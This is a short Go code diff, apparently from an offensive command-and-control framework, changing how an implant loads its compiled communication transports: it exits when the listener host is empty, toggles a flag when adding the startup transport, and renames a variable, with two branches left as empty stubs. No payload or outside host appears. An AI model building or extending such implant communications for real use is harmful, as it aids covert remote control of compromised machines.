@@ -17,27 +17,29 @@ func InitGhostComms() (err error) {
 	tpLog.Infof("Initializing implant communications")
 
 	startup, err := ParseCompiledTransports()
-	if err != nil {
+	// We have either an empty transport or an error from parsing.
+	if err != nil || startup.LHost == "" {
 		tpLog.Error(err)
 		security.Exit()
 	}
 
 	// Start it and add to active
-	Transports.Add(startup, false)
+	Transports.Add(startup, true)
 
 	return
 }
 
 // ParseCompiledTransports - Get pre-compiled transports. We only return the one used for startup communications.
-func ParseCompiledTransports() (start tpb.Transport, err error) {
+func ParseCompiledTransports() (startup tpb.Transport, err error) {
 
 	if assets.StartupTransport == "" && assets.OtherTransports == "" {
-		return start, errors.New("failed to parse/find any pre-compiled transport.")
+		return startup, errors.New("failed to parse/find any pre-compiled transport.")
 	}
 	if assets.StartupTransport != "" {
 
 	}
 
+	// Add other compiled transports to the Transport list
 	if assets.OtherTransports != "" {
 
 	}
